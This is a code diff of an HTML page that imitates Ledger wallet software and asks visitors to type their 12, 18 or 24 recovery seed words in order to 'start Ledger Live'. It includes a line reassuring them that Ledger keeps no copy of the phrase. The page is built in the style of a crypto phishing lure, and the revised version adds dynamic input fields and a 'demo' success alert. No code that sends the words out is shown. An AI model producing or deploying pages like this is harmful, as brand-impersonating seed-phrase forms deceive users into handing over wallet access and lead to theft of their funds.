@@ -1,136 +1,146 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify Seed Phrase | Ledger</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify Seed Phrase</title>
   <style>
     body {
-      background-color: #121212;
-      color: #fff;
-      font-family: "Roboto", "Space Mono", monospace;
+      font-family: "Courier New", monospace;
+      background-color: #111;
+      color: white;
       margin: 0;
       padding: 40px;
     }
 
-    .MuiTypography-root {
-      color: #fff;
-    }
-
-    .MuiTypography-h1 {
+    h1 {
       font-size: 28px;
-      font-weight: bold;
-      margin-bottom: 10px;
+      letter-spacing: 2px;
     }
 
-    .MuiTypography-body1 {
-      font-size: 14px;
-      line-height: 1.6;
+    p {
       color: #ccc;
+      font-size: 15px;
+      margin-top: 10px;
     }
 
-    .MuiButton-root {
-      background: #2a2a2a;
+    .btn-group {
+      margin-top: 25px;
+    }
+
+    .btn-group button {
+      background-color: #2a2a2a;
       border: none;
-      border-radius: 6px;
       color: white;
-      padding: 10px 22px;
-      font-size: 14px;
+      padding: 10px 25px;
+      margin-right: 10px;
+      border-radius: 6px;
       cursor: pointer;
-      transition: 0.2s;
-      font-family: 'Space Mono', monospace;
+      font-weight: bold;
+      transition: all 0.2s ease;
     }
 
-    .MuiButton-root:hover {
-      background: #7b5bf7;
+    .btn-group button.active {
+      background-color: #6f42c1;
+      color: white;
     }
 
-    .MuiGrid-container {
+    .input-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 14px;
-      margin-top: 25px;
-      margin-bottom: 25px;
-    }
-
-    .MuiOutlinedInput-input {
-      background-color: #1f1f1f;
-      border: 1px solid #333;
-      border-radius: 6px;
-      color: white;
-      font-size: 14px;
-      padding: 12px;
-      outline: none;
-      font-family: 'Space Mono', monospace;
-      width: 100%;
-      box-sizing: border-box;
-    }
-
-    .MuiOutlinedInput-input:focus {
-      border-color: #7b5bf7;
-    }
-
-    .MuiButtonBase-root.continue {
-      background: white;
-      color: black;
-      border-radius: 30px;
-      padding: 12px 35px;
+      gap: 15px;
       margin-top: 30px;
+      max-width: 1000px;
+    }
+
+    .input-grid input {
+      background-color: #1c1c1c;
+      border: none;
+      border-radius: 6px;
+      padding: 12px;
+      color: white;
+      font-size: 16px;
+      text-align: left;
+    }
+
+    .input-grid input::placeholder {
+      color: #777;
+    }
+
+    .continue-btn {
+      margin-top: 40px;
+    }
+
+    .continue-btn button {
+      background-color: white;
+      color: black;
+      padding: 10px 30px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
       font-weight: bold;
+      transition: 0.2s;
     }
 
-    .MuiButtonBase-root.continue:hover {
-      background: #ddd;
-    }
-
-    .MuiStack-root {
-      margin-bottom: 20px;
+    .continue-btn button:hover {
+      background-color: #ccc;
     }
   </style>
 </head>
 <body>
 
-  <div class="MuiBox-root css-1181h9g">
-    <div class="MuiStack-root css-wow8ur">
-      <h1 class="MuiTypography-root MuiTypography-h1 css-1l1v4bs">
-        VERIFY SEED PHRASE OF YOUR DEVICE
-      </h1>
-      <p class="MuiTypography-root MuiTypography-body1 css-1ohvh4v">
-        Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.
-      </p>
-      <p class="MuiTypography-root MuiTypography-body1 css-1ohvh4v">
-        **Ledger does not keep a copy of your recovery phrase.
-      </p>
-      <p class="MuiTypography-root MuiTypography-body1 css-1ohvh4v">
-        **ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.
-      </p>
-    </div>
+  <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
+  <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.</p>
+  <p>**Ledger does not keep a copy of your recovery phrase.</p>
+  <p>**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
 
-    <div class="MuiStack-root css-11xmmbb">
-      <button class="MuiButtonBase-root MuiButton-root css-33caym">12 Words</button>
-      <button class="MuiButtonBase-root MuiButton-root css-1c95r37">18 Words</button>
-      <button class="MuiButtonBase-root MuiButton-root css-1c95r37">24 Words</button>
-    </div>
-
-    <div class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 css-ca1c84">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="1" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="2" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="3" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="4" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="5" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="6" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="7" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="8" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="9" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="10" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="11" type="text">
-      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="12" type="text">
-    </div>
-
-    <div class="MuiGrid-root MuiGrid-direction-xs-row MuiGrid-grid-xs-12 css-bx9aap">
-      <button class="MuiButtonBase-root MuiButton-root continue" onclick="window.location.href='next.html'">Continue...</button>
-    </div>
+  <div class="btn-group">
+    <button id="btn12" class="active">12 Words</button>
+    <button id="btn18">18 Words</button>
+    <button id="btn24">24 Words</button>
   </div>
+
+  <div class="input-grid" id="inputs"></div>
+
+  <div class="continue-btn">
+    <button id="continueBtn">Continue...</button>
+  </div>
+
+  <script>
+    const buttons = document.querySelectorAll('.btn-group button');
+    const inputContainer = document.getElementById('inputs');
+    const continueBtn = document.getElementById('continueBtn');
+
+    // Function to create input fields
+    function createInputs(count) {
+      inputContainer.innerHTML = '';
+      for (let i = 1; i <= count; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.placeholder = i;
+        inputContainer.appendChild(input);
+      }
+    }
+
+    // Default load (12 words)
+    createInputs(12);
+
+    // Button click actions
+    buttons.forEach(button => {
+      button.addEventListener('click', () => {
+        buttons.forEach(b => b.classList.remove('active'));
+        button.classList.add('active');
+        const count = parseInt(button.textContent);
+        createInputs(count);
+      });
+    });
+
+    // Continue button action
+    continueBtn.addEventListener('click', () => {
+      alert("Seed phrase verified successfully (demo).");
+    });
+  </script>
 
 </body>
 </html>
